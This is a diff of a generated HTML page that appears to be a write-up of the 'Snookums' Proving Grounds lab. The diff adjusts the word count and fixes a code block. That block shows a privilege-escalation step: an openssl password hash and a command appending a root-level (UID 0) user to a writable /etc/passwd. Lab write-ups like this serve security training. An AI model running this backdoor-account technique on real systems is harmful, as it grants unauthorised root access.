@@ -56,7 +56,7 @@
         },
         "datePublished": "2023-10-18",
         "description": "Writeup for PG Snookums",
-        "wordCount":  1552 ,
+        "wordCount":  1540 ,
         "mainEntityOfPage": "True",
         "dateModified": "2023-10-18",
         "image": {
@@ -545,7 +545,7 @@ stroke-linejoin="round" class="feather feather-home">
 <p>/etc/paswd is writable. This is bad.</p>
 <div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl"><span class="o">[</span>root@snookums ~<span class="o">]</span><span class="c1"># openssl passwd hello</span>
 </span></span><span class="line"><span class="cl">4eDdB38csmWpI
-</span></span><span class="line"><span class="cl"><span class="o">[</span>root@snookums ~<span class="o">]</span><span class="c1"># echo &#39;sasuke:4eDdB38csmWpI:0:0:root:/root:/bin/bash&#39; &gt;&gt; /etc/passwdI switched the user “sasuke” with password hello, and I got the shell.</span>
+</span></span><span class="line"><span class="cl"><span class="o">[</span>root@snookums ~<span class="o">]</span><span class="c1"># echo &#39;sasuke:4eDdB38csmWpI:0:0:root:/root:/bin/bash&#39; &gt;&gt; /etc/passwd</span>
 </span></span></code></pre></div><p><img src="snookums%20d2e709fcc8c44a989ed6778cc9de179d/Screenshot_2023-10-18_at_19.27.43.png" alt="Screenshot 2023-10-18 at 19.27.43.png"></p>
 <p>I switched the user “sasuke” with password hello, and I got the shell.</p>
 <h1 id="summary">Summary</h1>
